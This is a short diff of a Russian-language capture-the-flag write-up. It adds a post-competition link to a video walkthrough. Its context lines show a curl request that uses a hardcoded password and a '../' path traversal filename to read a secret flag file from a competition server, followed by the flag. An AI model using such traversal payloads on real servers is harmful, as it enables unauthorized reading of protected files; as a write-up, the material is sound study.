@@ -350,3 +350,9 @@ P.S. Уязвимость в **docker-compose.yml** не пригодилась 
 $ curl -X GET -G http://193.41.142.9:8002/files -d 'password=qgzc6!78zxcbkj123fdgd234' -d 'filename=../src/secret_files/flag.txt'
 flag{a0a7c3fff21f2aea3cfa1d0316dd816c}
 ```
+
+---
+
+**UPDATE** после завершения соревнования.
+
+Разбор: https://youtu.be/5tt8xsAhYBI
